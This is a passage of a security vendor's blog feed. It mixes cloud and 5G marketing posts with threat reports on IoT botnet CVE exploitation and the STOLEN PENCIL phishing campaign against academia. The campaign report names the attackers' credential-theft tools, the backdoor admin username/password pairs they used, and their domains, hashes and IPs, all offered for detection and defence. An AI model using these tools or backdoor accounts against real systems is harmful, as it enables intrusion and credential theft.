<p>Let’s take a deeper dive into two of these vulnerabilities, CVE-2014-8361 and CVE-2017-17215. The example in <strong>Figure 2</strong> shows the use of CVE-2014-8361 to deliver a MIPS variant of Mirai. As we see in the highlighted payload below, the vulnerability uses “wget” to download a copy of the bot and execute it on a vulnerable device. CVE-2014-8361 was publicly disclosed in April of 2015 and has been used in several high profile IoT botnets such as <a href="https://asert.arbornetworks.com/omg-mirai-minions-are-wicked/">Satori and JenX</a>.</p>

<p><img alt="Figure 2: Example of CVE-2014-8361" src="https://www.netscout.com/sites/default/files/inline-images/fig2-cve-2014-8361-768x391.png" /></p>

<p style="text-align: center;"><strong>Figure 2: Example of CVE-2014-8361</strong></p>

<p><strong>Figure 3</strong> is an example of CVE-2017-17215, which was used to deliver yet another variant of Mirai. In similar fashion, we see the abuse of “wget” to download the bot and execute it on the vulnerable device. CVE-2017-17215 was also leveraged in several high profile IoT botnets. This vulnerability was disclosed in December 2017 with a proof of concept published on exploit-db on December 25, 2017.</p>

<p><img alt="Figure 3: Example of CVE-2017-17215" data-entity-type="file" data-entity-uuid="c18bbb05-edcc-4c70-91d3-ff674d36eb3a" src="http://localhost:7996/sites/default/files/inline-images/fig3-cve-2017-17215-768x325.png" /></p>

<p style="text-align: center;"><strong>Figure 3: Example of CVE-2017-17215</strong></p>

<p>As the rate of patching IoT devices is done at a glacial pace, these older vulnerabilities are still leveraged by IoT botnets due to their level of success. The continued use of these tried and true vulnerabilities highlights “what is old is new” when it comes to IoT botnets. <strong>Summary</strong> IoT devices sooner or later get patched, but not at the same rate nor priority which we see with operating systems. This makes the longevity and usefulness of IoT based vulnerabilities much longer and very attractive to botnet authors. This trend can be seen within our honeypot data. Due to the sheer number of IoT devices connected to the internet, finding vulnerable devices is easy and quick. Add to the mix the large delta of when a vulnerable device is “turned on” and when updates for security vulnerabilities are applied, and attackers can quickly amass large botnets. In most cases these botnets are immediately conscripted into a DDoS army. It doesn’t take a significant amount of effort to create a large IoT botnet and create havoc, as we saw with the DDoS attacks conducted by Mirai in 2016. As we end 2018 and roll in to 2019, we’ll continue to see an uptick in the use of IoT based vulnerabilities. The ease of updating botnet source code like Mirai to take advantage of these vulnerabilities plays a significant role. The ability to create larger botnets with minimal time and resources translates into why we are seeing a trend in the amount of IoT botnets.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/honeypot-1024x683-768x344.jpg" length="74562" type="image/jpeg"/>
    <guid isPermaLink="false">0ee6eb5a-f1af-423b-8cf1-2930064716e6</guid>
    <pubDate>Wed, 12 Dec 2018 10:01:19 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Achieving Service Assurance across Multi-Cloud Environments</title>
  <link>http://localhost:7996/blog/service-assurance-across-multi-cloud</link>
  <description>Assuring business services across changing, multi-cloud infrastructure offers businesses strategic advantages in flexibility and a better end-user experience.</description>
  <content:encoded><![CDATA[<p>Business leaders across virtually every industry now recognize that leveraging the cloud is essential to remain competitive. And according to a survey conducted by <a href="https://hbr.org/sponsored/2017/05/adopting-hybrid-cloud-becomes-a-strategic-imperative">Harvard Business Review</a> Analytic Services, cost efficiency is not the only advantage:</p>

<p><img alt="HBR Survey" data-entity-type="file" data-entity-uuid="11a41168-f4ca-4028-bc2f-6f1f490ca9b3" src="http://localhost:7996/sites/default/files/inline-images/12.11.18%20image%201.png" /></p>

<p>The ability to offer the flexible, high performance digital services that run on these cloud infrastructures, from customer engagement applications to internal operational services, drive today’s enterprise.</p>

<p>The perpetual quest for greater flexibility, better cost efficiencies and performance continues to generate more complex cloud configurations. Multi-cloud computing – which includes hybrid, federated, public and private cloud infrastructures – has become fundamental to providing these services:</p>

<p><img alt="Ent Cloud Strategy" data-entity-type="file" data-entity-uuid="9585a6a5-f0de-414d-829a-186721bbe747" height="316" src="http://localhost:7996/sites/default/files/inline-images/12.11.18%20image%202_0.png" width="526" /></p>

<p><br /><a href="https://www.rightscale.com/lp/state-of-the-cloud">https://www.rightscale.com/lp/state-of-the-cloud</a> </p>

<p>It should come as no surprise that according to a global state of IT report, cloud computing ranked as the number one technology to have the most transformational impact on business – above artificial intelligence (AI) and mobile technologies for customers.</p>

<p><strong>Increasing Complexity of Running Applications in the Cloud</strong></p>

<p>Assuring the performance of business applications across multiple clouds is hampered by the complexity of run-time infrastructure and poor, actionable visibility. Nailing down the real source of a problem becomes difficult, time-consuming and problematic. Multiple vendors, from cloud vendors to application developers to WAN and ISPs, are certain the problem is not theirs. Point solution tools rule out potential areas of disruption rather than pin-point the true source.</p>

<p>The evolution of application code itself contributes to this challenge. Business applications built with micro-services distribute workloads to disparate combinations of on-premise, private and multiple public clouds, in fact frequently beyond your control, e.g. SasS services. Business applications also often rely on opaque, third party services, e.g. payment functions on a website. It becomes difficult to spot poorly written applications or isolate precisely where an application is struggling. Increasing network traffic, micro-services and this inter-connectedness can quickly introduce hard to pinpoint load and latency problems or communication issues that result in degraded application performance.</p>

<p><strong>The Price of Complexity: Application Assurance</strong></p>

<p>More complex, multi-cloud and hybrid infrastructure alone may or may not introduce problems running applications – but it certainly makes it much harder to monitor, let alone pin-point the root-cause of application failure and repair quickly (MTTR). Designed for byte code, server-centric applications, APM tools focus on inter-process communications <em>within a server instance</em>. Applications built on micro-services run independent, dynamic workloads <em>across multi-cloud environments</em>. The risks to critical business services escalate as organizations migrate more applications to multiple clouds, and the applications themselves become more interdependent via micro-services.</p>

<p>As the sheer scale, scope and reliance upon business applications grows, the burden on IT to assure services will only increase. Organizations will find it harder and harder to:</p>

<ul><li>Cost effectively deploy reliable applications across physical, virtual, hybrid and multi-cloud environments;</li>
	<li>Adequately monitor, and secure, critical business application performance, increasing risk to the business;</li>
	<li>Pinpoint/fix dynamic service-delivery bottlenecks, minimize disruption, and reduce (or maintain) MTTR to assure a higher quality end-user experience;</li>
</ul><p><strong>What is Needed?</strong></p>

<p>Running applications on today’s infrastructures requires complete performance visibility across complex hybrid networks – a single view across physical, virtual and multi-cloud workloads. Application assurance means comprehensive visibility on the dependencies (introduced with distributed micro-services) throughout the path of service delivery (applications, protocols, elements, across campus, data centers, Internet, cloud providers, etc.). The best solution is a precise, cloud-agnostic view that does not discriminate between public, private or changing cloud environments, frequently third party and public.</p>

<p>Monitoring traffic in real-time, aka wire-data, is the best way to get a precise, line-of-sight view of application behavior, service dependencies, error details and true source of the root cause of failure. Wire-data is precise, portraying real-time behavior and consistent. Most importantly it is inclusive end-to-end: every application action and transaction must navigate the digital infrastructure – no matter physical, virtual, cloud or hybrid.</p>

<p>Given the volume of wire-data, automatic recognition of applications, protocols and other common elements will be required for ’smart’, actionable analysis. Smart analysis of wire data enables an in-depth understanding of application and system performance issues, independent of application source code and with no need for byte code instrumentation. Visibility that can empower real-time action requires the intelligent extraction and distillation of the most critical insights from the wire-data. Automatic, smart analysis of wire traffic is really the only source of precise, end-to-end visibility of application performance.</p>

<p><strong>Successful Service Assurance across Complex, Hybrid Infrastructures</strong></p>

<p><a href="https://www.netscout.com/sites/default/files/2018-06/NETSCOUT_CS_Healthcare_Provider_Solves_Imaging_Application_Slowdown.pdf"><em>Healthcare Imaging Application Performance</em></a><br />
Doctors at a leading healthcare provider of over 1,200 physicians and 15,000 full-time employees were waiting up to 20 minutes to view cardiology images from the radiology information system (RIS) application. The organization spent several weeks and daily “war room” calls that at times involved upward of 20 people – IT staff, third party vendors, and the application provider – trying to pinpoint the source of the problem. The deployment of the vSTREAM virtual appliance monitoring wire-data provided Adaptive Service Intelligence™ (ASI) and quickly pin-pointed the root cause of the problem to a mistake in the radiology application that sent recent images to a cloud storage service. Once the application was re-written to store recent images in the private, campus-based cloud, cardiac image retrieval times were reduced from 20 minutes to seconds.</p>

<p><a href="https://www.netscout.com/sites/default/files/2018-07/Hospitality-Assures-Quality-Application-Services.pdf"><em>Customer Application Quality Assurance</em></a></p>

<p>A multi-national hospitality corporation hosts millions of travelers at a broad portfolio of lodging and hotel facilities in over 120 countries – quality customer experiences are the life-blood of the business. After a recent acquisition, the IT team faced the challenge of providing service assurance for the website, inventory application, credit card authorization system, and frequent buyer programs across two different data center environments. By deploying vSCOUT on the web application servers IT was able to reduce complexity, and uncover service dependencies across application, compute and network workloads. IT reduced mean-time-to-repair (MTTR) for network issues, protecting millions in potential revenue for the business as well as ensure the highest quality customer experience.</p>

<p><a href="https://www.netscout.com/sites/default/files/2018-06/NETSCOUT_CS_Migrating_Services_to_Hybrid_Cloud_with_Confidence.pdf"><em>Migrating Industrial Health &amp; Safety Applications</em></a></p>

<p>An international pipeline and power company with over 15,000 employees and 3.5M retail customers is required to adhere to multiple safety and compliance guidelines. “Always-on” digital services are at the hearth of their health and safety systems, putting IT under significant pressure in protecting employees – let alone face stiff regulatory fines and penalties. Moving these systems to a hybrid cloud required performance assurance before, during and after the migration. IT implemented the nGeniusONE Service Assurance platform, powered by Adaptive Service Intelligence™ (ASI), to provide end-to-end troubleshooting across the hybrid cloud, ending time-wasting finger-pointing, better collaboration with third-party vendors to resolve issues quickly, and maintain health and safety compliance.</p>

<p><strong>The Strategic Advantages of Assured Business Services</strong></p>

<p>The adoption of hybrid, multi-cloud infrastructure has become a business imperative, not only for cost efficiencies. Assuring business services across changing, multi-cloud infrastructure offers businesses strategic advantages in flexibility and a better end-user experience. Seamless application performance delivering a superior end-user experience requires operating increasingly critical applications flawlessly across public, private and conventional infrastructure. True service assurance means going beyond byte code instrumentation to using smart data for system-level telemetry, providing the situational awareness to run everything reliably and confidently on hybrid cloud or multi-cloud infrastructure.</p>

<p> </p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/cloud.jpg" length="208774" type="image/jpeg"/>
    <guid isPermaLink="false">bc8930e0-b1ce-4ad5-8cbe-df562377a1fc</guid>
    <pubDate>Tue, 11 Dec 2018 21:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Eileen Haggerty</dc:creator>
    </item>
<item>
  <title>STOLEN PENCIL Campaign Targets Academia</title>
  <link>http://localhost:7996/blog/asert/stolen-pencil-campaign-targets-academia</link>
  <description>ASERT has learned of an APT campaign, possibly originating from DPRK, we are calling STOLEN PENCIL that is targeting academic institutions since at least May 2018.</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p>ASERT has learned of an APT campaign, possibly originating from DPRK, we are calling STOLEN PENCIL that is targeting academic institutions since at least May 2018. The ultimate motivation behind the attacks is unclear, but the threat actors are adept at scavenging for credentials. Targets are sent spear phishing e-mails that lead them to a web site displaying a lure document and are immediately prompted to install a malicious Google Chrome extension. Once gaining a foothold, the threat actors use off-the-shelf tools to ensure persistence, including Remote Desktop Protocol (RDP) to maintain access.</p>

<p> </p>

<p><strong><em>NOTE:</em></strong><em> NetScout AED/APS enterprise security products detect, and block activity related to STOLEN PENCIL using our ATLAS Intelligence Feed (AIF).</em></p>

<h2><span class="normaltextrun">Key Findings</span><span class="eop"> </span></h2>

<ul><li>A wide variety of phishing domains imply other targets, but those focused on academia were intended to install a malicious Chrome extension.</li>
	<li>A large number of the victims, across multiple universities, had expertise in biomedical engineering, possibly suggesting a motivation for the attackers targeting.</li>
	<li>Poor OPSEC led to users finding open web browsers in Korean, English-to-Korean translators open, and keyboards switched to Korean .</li>
	<li>The threat actors use built-in Windows administration tools and commercial off-the-shelf software to “live off the land”. The threat actor at the keyboard uses RDP to access compromised systems rather than a backdoor or Remote Access Trojan (RAT).</li>
	<li>Post-exploitation persistence is maintained by harvesting passwords from a wide variety of sources such as process memory, web browsers, network sniffing, and keyloggers.</li>
	<li>There is no evidence of data theft, leaving the motivation behind STOLEN PENCIL largely uncertain.</li>
</ul><h2>Spear Phishing</h2>

<table border="0" cellpadding="1" cellspacing="1"><tbody><tr><td width="300"><img alt="Threat Chain" data-entity-type="file" data-entity-uuid="c6466008-ba2c-4a99-905c-6bc474868f94" src="http://localhost:7996/sites/default/files/inline-images/chain-196x1024.png" /></td>
			<td valign="top" width="300">
			<p>In keeping with tried and true tactics, the operators behind the STOLEN PENCIL campaign used spear-phishing as their initial intrusion vector (left Figure 1). First reported by Twitter user @MD0ugh, a target of STOLEN PENCIL receives a spear-phishing message containing a link to one of several domains controlled by the threat actor. We’ve identified several domains used for phishing (below). client-message[.]com</p>

			<ul><li>world-paper[.]net</li>
				<li>docsdriver[.]com</li>
				<li>grsvps[.]com</li>
				<li>coreytrevathan[.]com</li>
				<li>gworldtech[.]com</li>
			</ul><p>In addition to the Top-Level Domains (TLDs), we’ve uncovered a number of sub-domains used by the actors (below):</p>

			<ul><li>aswewd.docsdriver[.]com</li>
				<li>facebook.docsdriver[.]com</li>
				<li>falken.docsdriver[.]com</li>
				<li>finder.docsdriver[.]com</li>
				<li>government.docsdriver[.]com</li>
				<li>keishancowan.docsdriver[.]com</li>
				<li>korean-summit.docsdriver[.]com</li>
				<li>mofa.docsdriver[.]com</li>
				<li>northkorea.docsdriver[.]com</li>
				<li>o365.docsdriver[.]com</li>
				<li>observatoireplurilinguisnorthkorea.docsdriver[.]com</li>
				<li>oodwd.docsdriver[.]com</li>
				<li>twitter.docsdriver[.]com</li>
				<li>whois.docsdriver[.]com</li>
				<li><a href="http://www.docsdriver[.]com">www.docsdriver[.]com</a></li>
			</ul></td>
		</tr></tbody></table><p>Many of the subdomains contain basic phishing pages, consisting of saved HTML of common web login properties. Some of the pages contain the “MarkOfTheWeb” artifact inserted by the web browser when the threat actor clicked “Save As” on the page they intend to impersonate. <a href="https://www.riskiq.com/blog/labs/markoftheweb/">RiskIQ discussed</a> this technique, although we do not believe the campaigns are related. The more sophisticated phishing pages targeting academia display a benign PDF in an IFRAME. It then redirects the user to install a “Font Manager” extension from the Chrome Web Store, as seen in Figure 2.  </p>

<p><img alt="HTML Source of Phishing Page" data-entity-type="file" data-entity-uuid="0aabe586-9866-4aff-bfc6-aa9764200f30" src="http://localhost:7996/sites/default/files/inline-images/chrome_redir-1024x281.png" /></p>

<p><strong>Figure 2: HTML Source of Phishing Page</strong> The malicious extensions, now removed from the Chrome Web Store, contain reviews left by the threat actor using compromised Google+ accounts. The text of the reviews were copy/pasted from other extensions and were all rated “five-stars”, even if the copied text was negative. It’s likely the compromised accounts used to leave reviews were from individuals the threat actors assume the target would know and trust.  It should be noted however, that some users reported deleting the extension immediately because it prevented the Chrome browser from functioning properly.  This could suggest mistakes or poorly written code that utilized too many resources to remain functional and stealthy, at least for some users. The malicious Chrome extensions declare permissions to run on every URL in the browser, as seen in Figure 3.</p>

<p><img alt=" manifest.json with &lt;all_urls&gt; " data-entity-type="file" data-entity-uuid="f1ba8d81-b3de-4fb5-b560-a57c39c925fc" src="http://localhost:7996/sites/default/files/inline-images/extension_perms-1024x112.png" /></p>

<p><strong>Figure 3: manifest.json with &lt;all_urls&gt;</strong> The extensions load JavaScript from a separate site, shown in Figure 4. The name of the loaded JavaScript file is jQuery.js. When retrieving this file at the time of our analysis, the content was a legitimate jQuery file. We speculate that the attacker replaced the malicious JavaScript with a benign payload to deter analysis. Loading jQuery.js from an external site makes no sense, since the latest version of extension has a legitimate jQuery.js included in the extension bundle.</p>

<p> </p>

<p><strong><img alt="manage.js snippet, beautified" data-entity-type="file" data-entity-uuid="bccd42e0-2c61-4fd8-89aa-394c5cc8357a" src="http://localhost:7996/sites/default/files/inline-images/extension_jscript-1024x795.png" /></strong></p>

<p><strong>Figure 4: </strong>Given the threat actor’s propensity for password theft, and the fact that the malicious Chrome extensions were situated to read data from every website, it's likely that the intent is to steal browser cookies and passwords.  Email forwarding was also observed on some compromised accounts. While GDPR requirements prevented us from pivoting on Registrant information, the actors reused IP space, reused a certificate, and the aforementioned domain mimicking technique allowed for some pivoting.  A variety of infrastructure was discovered. Those IOCs are included below.</p>

<h2>Toolset</h2>

<p>Once gaining a foothold on a user’s system, the threat actors behind STOLEN PENCIL use Microsoft’s Remote Desktop Protocol (RDP) for remote point-and-click access.  This means a human is behind the keyboard interacting with a compromised system, and not using a RAT (Remote Access Trojan) with a command-and-control site acting as a proxy between the threat actor and the compromised system. RDP access occurred daily from 06:00-09:00 UTC (01:00-04:00 EST).  In one case, we noted that the threat actor changed the victim’s keyboard layout to Korean. A compromised or stolen certificate was used to sign several PE files used in STOLEN PENCIL for two sets of tools:</p>

<ul><li>MECHANICAL
	<ul><li>Logs keystrokes to %userprofile%\appdata\roaming\apach.{txt,log} and also functions as a “cryptojacker” that replaces Ethereum wallet addresses with 0x33883E87807d6e71fDc24968cefc9b0d10aC214E. This Ethereum wallet address currently has a zero balance and no transactions.</li>
	</ul></li>
	<li>GREASE
	<ul><li>a tool to add a Windows administrator account with a specific username/password and enable RDP, circumventing any firewall rules. We’ve observed the following list of username/password combinations, though the significance of “1215” is unknown:
		<ul><li>LocalAdmin/Security1215!</li>
			<li>dieadmin1/waldo1215!</li>
			<li>dnsadmin/waldo1215!</li>
			<li>DefaultAccounts/Security1215!</li>
			<li>defaultes/1qaz2wsx#EDC</li>
		</ul></li>
	</ul></li>
</ul><p>The certificate chain used in the majority of both MECHANICAL and GREASE samples is shown in Figure 5.</p>

<p><img alt="Certificate used to sign MECHANICAL/GREASE" src="http://localhost:7996/sites/default/files/inline-images/cert-768x609.png" /><img alt="" class="alignnone wp-image-9650" data-entity-type="file" data-entity-uuid="f11d3050-d4d0-4740-9e69-423a6f0d82b8" height="415" src="http://localhost:7996/sites/default/files/inline-images/cert-768x609.png" width="522" /><strong>Figure 5: Certificate used to sign MECHANICAL/GREASE</strong> While the threat actors did use a few tools to automate intrusions, we also found a ZIP archive of tools that demonstrate their propensity for password theft to propagate. Inside the archive we found the following tools:</p>

<ul><li>KPortScan – a GUI-based portscanner</li>
	<li>PsExec – a tool to remotely execute commands on Windows systems</li>
	<li>Batch files for enabling RDP and bypassing firewall rules</li>
	<li>Procdump – a tool to dump process memory, along with a batch file to dump the lsass process for password extraction</li>
	<li>Mimikatz – a tool to dump passwords and hashes</li>
	<li>The Eternal suite of exploits, along with batch files for rapid scanning and exploitation</li>
	<li>Nirsoft Mail PassView – a tool to dump saved mail passwords</li>
	<li>Nirsoft Network Password Recovery – a tool to dump saved Windows password</li>
	<li>Nirsoft Remote Desktop PassView – a tool to dump saved RDP passwords</li>
	<li>Nirsoft SniffPass – a tool to sniff the network for passwords sent over insecure protocols</li>
	<li>Nirsoft WebBrowserPassView – a tool to dump passwords stored in a variety of browsers</li>
</ul><p>Clearly this toolset can be used to scavenge passwords stored in a wide array of locations. Using a combination of stolen passwords, backdoor accounts, and a forced-open RDP service, the threat actors are likely to retain a foothold on a compromised system.</p>

<h2>Recommendations</h2>

<ul><li>Advise users not to click on any suspicious links in an e-mail, both at work and at home, even if they are from people they trust.</li>
	<li>Advise users to be wary of any prompts to install browser extensions, even if they are hosted on an official extension site.</li>
	<li>Watch for e-mails containing links to the phishing domains.</li>
	<li>Limit RDP access with a firewall to only those systems that require it. Monitor for suspicious RDP connections where there should be none.</li>
	<li>Look for suspicious, newly created administrative accounts.</li>
</ul><h2>Conclusion</h2>

<p>While we were able to gain insight into the threat actor’s TTPs (Tools, Techniques, &amp; Procedures) behind STOLEN PENCIL, this is clearly just a small window into their activity. Their techniques are relatively basic, and much of their toolset consists of off-the-shelf programs and living off the land.  This, along with the presence of the cryptojacker, is typical of DPRK tradecraft.  Additionally, the operators’ poor OPSEC exposes their Korean language, in both viewed websites and keyboard selections. They spent significant time and resources doing reconnaissance on their targets, as evidenced by the comments left on the Chrome extension page. Their main goal appears to be gaining access to compromised accounts and systems via stolen credentials and holding on to it. We were not able to find any evidence of data theft – their motives for targeting academia remains murky.</p>

<h2>IOCs</h2>

<p>MECHANICAL hashes 9d1e11bb4ec34e82e09b4401cd37cf71 8b8a2b271ded23c40918f0a2c410571d GREASE hashes 2ec54216e79120ba9d6ed2640948ce43 6a127b94417e224a237c25d0155e95d6 fd14c377bf19ed5603b761754c388d72 1d6ce0778cabecea9ac6b985435b268b ab4a0b24f706e736af6052da540351d8 f082f689394ac71764bca90558b52c4e ecda8838823680a0dfc9295bdc2e31fa 1cdb3f1da5c45ac94257dbf306b53157 2d8c16c1b00e565f3b99ff808287983e 5b32288e93c344ad5509e76967ce2b18 4e0696d83fa1b0804f95b94fc7c5ec0b af84eb2462e0b47d9595c21cf0e623a5 75dd30fd0c5cf23d4275576b43bbab2c 98de4176903c07b13dfa4849ec88686a 09fabdc9aca558bb4ecf2219bb440d98 1bd173ee743b49cee0d5f89991fc7b91 e5e8f74011167da1bf3247dae16ee605 0569606a0a57457872b54895cf642143 52dbd041692e57790a4f976377adeade DOMAINS: bizsonet.ayar[.]biz bizsonet[.]com client-message[.]com client-screenfonts[.]com *.coreytrevathan[.]com  (possibly compromised legitimate site) docsdriver[.]com grsvps[.]com *.gworldtech[.]com  (possibly compromised legitimate site) itservicedesk[.]org pqexport[.]com scaurri[.]com secozco[.]com sharedriver[.]pw sharedriver[.]us tempdomain8899[.]com world-paper[.]net zwfaxi[.]com IPs: 104.148.109[.]48 107.175.130[.]191 132.148.240[.]198 134.73.90[.]114 172.81.132[.]211 173.248.170[.]149 5.196.169[.]223 74.208.247[.]127 92.222.212[.]0  </p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">b14a3a48-6c88-4013-98ab-f4a29877a0be</guid>
    <pubDate>Wed, 05 Dec 2018 10:00:06 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>A Brave New Mobile World Fueled by Smart Data &amp; Intelligence</title>
  <link>http://localhost:7996/blog/brave-new-mobile-world</link>
  <description>As cellular service providers increasingly must compete in today’s brave new world of over-the-top (OTT) services and a mobile broadband explosion that features all-you-can-eat, unlimited data plans, mobile carriers can no longer operate on previous business models.</description>
  <content:encoded><![CDATA[<p>As cellular service providers increasingly must compete in today’s brave new world of over-the-top (OTT) services and a mobile broadband explosion that features all-you-can-eat, unlimited data plans, mobile carriers can no longer operate on previous business models. Further complicating the challenge, new digital, cloud-based players, such as Amazon (AWS), Google (Cloud) and Microsoft (Azure) have changed the service delivery game with agile, pay-as-you-grow and on-demand pricing models for telecom services. Adding to the competitive landscape, cable/MSOs have begun building a fixed mobile network with Wi-Fi access points and hot spots enabling new services such as voice-over-Wifi (VoWifi).</p>

<p>Layer on top of this the growing proliferation of new Internet of Things (IoT) devices and services, which often don’t fall into one of the traditional voice, video and data buckets, and it’s clear that mobile carriers have considerable hurdles to overcome. When combined with the daunting task of upgrading and adding 5G technology to carrier networks, it is little wonder that cellular service providers are exploring new business models to remain competitive and thrive in this rapidly evolving marketplace.</p>

<p>A new generation of 5G cellular communications will enable a host of new connected technologies, such as autonomous vehicles, smart cities, robotics, emergency and security applications, power sensors, and health monitors, with ultra-low latency, expanded (device) density, and extreme bandwidth.</p>

<p>Of course, ensuring that these devices are constantly connected, and that network performance and security is optimal will necessitate enhanced service and security assurance. The key to achieving the scalability and holistic visibility into new, virtualized infrastructures as well as legacy network infrastructures - which will be instrumental to future success - is real-time smart data.</p>

<p>As mobile carriers engage in the most ambitious and important transformations in history, newer and better performance monitoring instrumentation will be needed. Virtual probes that provide visibility down to the VNF level, while retaining the micro-service construct and subscriber session context and user experience, will be essential if mobile carriers are to retain visibility and perform proactive monitoring and service triage in their hybrid and virtualized network infrastructure. And with the gradual rollout of 5G, carriers will need holistic visibility into a multi-layer network of 2G, 3G, 4G infrastructure and virtualized functions. Again, smart data is the answer.&nbsp;</p>

<p>Going forward, mobile carriers will be looking to realize the benefits of automation and unlocking the cost savings and agility promised by virtualization. Smart data, gleaned from real-time IP traffic, is going to be an essential part of closed loop automation processes. Having lightweight, virtualized instrumentation that can “see” IP packets at accelerated speeds and create real-time, extensible data to inform the policy engine is going to be indispensable with the emergence of mobile edge computing, network slicing and C-RAN in new 5G networks.</p>

<p>In the past, service assurance and security solutions were an afterthought that would be appended to existing networks instead of incorporated at the outset. As mobile service providers compete in today’s new digital world, a software-based, pervasive instrumentation model for service and security assurance is needed. By employing such an approach from beginning with 5G/IoT and virtualization, mobile operators will have access to the data and intelligence they need to manage and monetize traffic in their evolving networks.</p>

<p>Mobile service providers delivering voice, video and data services over physical, virtual and hybrid networks can proactively utilize smart visibility and smart data to ensure service assurance continuity on the journey to the cloud, while delivering lower costs, higher intelligence, and a continued carrier-grade experience in a more secure network. This is surely welcome news for providers.</p>

<p>To learn more visit the&nbsp;<a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-120418-1">NETSCOUT NVF Smarter page</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_121413886.jpg" length="4810529" type="image/jpeg"/>
    <guid isPermaLink="false">353c5781-5342-48d0-a709-d13d921a65c5</guid>
    <pubDate>Tue, 04 Dec 2018 15:30:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Are You Up to the Challenge of Software Defined Networking?</title>
  <link>http://localhost:7996/blog/software-defined-networking-challenge</link>
  <description>Today’s successful enterprise requires a ‘fast and flat’ network that can provide the business agility to quickly spin-up compute and storage resources to deliver applications wherever and whenever they are required. Yet the abstraction of storage, compute and networking, whether on premise or in the cloud, transforms the provisioning for and delivery of business services and...</description>
  <content:encoded><![CDATA[<p>Today’s successful enterprise requires a ‘fast and flat’ network, ‘composeable’ infrastructure that can provide the business agility to quickly spin up compute and storage resources to deliver applications wherever and whenever they are required. Software Defined Networking (SDN) combined with public cloud infrastructure and evolving orchestration tools holds out just such a promise. [The new VMware Cloud (VMC) running on AWS is a good example of such flexibility. VMC delivers a complete Software-Defined Data Center (SDDC) stack running VMware vSphere, VSAN and NSX on hardware inside Amazon data centers.] And according to a 2017 survey of over 1,000 IT professionals, 85 percent of enterprises have a multi-cloud strategy already in place.</p>

<p><img alt="Multi-cloud strategies" data-entity-type="file" data-entity-uuid="07916d67-3c37-4143-99e2-3ba7743dae27" src="http://localhost:7996/sites/default/files/inline-images/ChallengeSWblog_image001.png" /></p>

<p>Yet the abstraction of storage, compute and networking, whether on premise or in the cloud, transforms the provisioning for and delivery of business services and applications. The adoption of SDN and public cloud infrastructure will change how we configure and consume business services in ways we are only beginning to realize. Alongside the undeniable benefits, where are the ‘gotchas’ inherent in composeable infrastructure? What might be, and how do we anticipate the inevitable Software Defined Networking challenges that are bound to emerge?</p>

<blockquote>"As more workloads move to the cloud, cybersecurity professionals are increasingly realizing the complications to protect these workloads. The top three security control challenges SOCs are struggling with are visibility into infrastructure security (43 percent), compliance (38 percent), and setting consistent security policies across cloud and on-premises environments (35 percent)." <em>- 2018 Cloud Security Report, CyberSecurity Insiders</em></blockquote>

<h3>Spin Up Whenever and Wherever You Want, but…</h3>

<p>The biggest challenge facing enterprise in the pursuit of truly cost-effective, high performance and secure infrastructure must be <em>achieving continuous, end-to-end <a href="https://www.netscout.com/solutions/enterprise/network-visibility">network visibilit</a>y</em>. A disruptive approach to the entire application provisioning, networking, and infrastructure ecosystem naturally requires a different approach to system monitoring. Lack of seamless, real-time visibility makes it difficult (if not impossible) to assure applications, optimize performance, or secure the infrastructure.</p>

<p>Just as business operations have become dependent on the availability of high performance applications, monitoring service assurance has become increasingly more complicated. Current monitoring solutions are fragmented and piece-meal, leading to different data sources, different levels of granularity and questions of relevance. What are the right Key Performance Indicators (KPIs)? For whom?</p>

<p><img alt="complex network systems" data-entity-type="file" data-entity-uuid="d3007dd9-b0d1-4155-8cc1-31e825a7549f" src="http://localhost:7996/sites/default/files/inline-images/ChallengeSWblog_image003.png" /></p>

<p>There is little automatic coordination (if any coordination) between different monitoring groups and tool sets. Relying on server logs, or the flood of alerts and potential Indicators of Compromise (IoCs) from NextGen Firewalls or SIEMs, or piecemeal, byte code instrumentation from current <a href="https://www.netscout.com/network-monitoring/application-performance-management">Application Performance Management (APM) </a>tools does not provide complete nor continuous monitoring. <em>Such a strategy will only get more risky as the complexity of the network and the scale of enterprise applications increases.</em> And monitoring workloads which can be readily distributed across hybrid architectures is only the beginning of the achieving real visibility challenge.</p>

<p>Achieving complete and continuous visibility is complicated by the evolution of business applications themselves, from monolithic, server-centric code to transitory, distributed microservices. Existing APM tools focus by design on application inter-process communications within a server instance. Yet microservices communicate across networks using lightweight APIs, which in itself adds more traffic to the network.</p>

<p><img alt="Microservices" data-entity-type="file" data-entity-uuid="775d63e5-91a4-4384-b738-744e6351d647" src="http://localhost:7996/sites/default/files/inline-images/ChallengeSWblog_image004.png" /></p>

<p>The ease of automatically spinning up virtual machines and applications running in temporary, substantially opaque containers adds yet more layers of complexity. This model increases the risk of performance degradation or failure due to difficult to pinpoint load and latency errors, communication problems, and logic or sheer scale creating time out issues across extended infrastructure. Naturally any application is dependent upon the reliability and performance of all its microservice components. The metaphor that comes to mind is the ‘weakest link in the chain’.</p>

<p>The new architectures tend to result in networks that are segregated into East/West (within an application) and North/South (across VMs, across clouds, between infrastructures) configurations. Just as distributed workloads initiated by microservices are difficult to monitor with server-centric APM tools, North/South traffic also presents its own set of visibility challenges.</p>

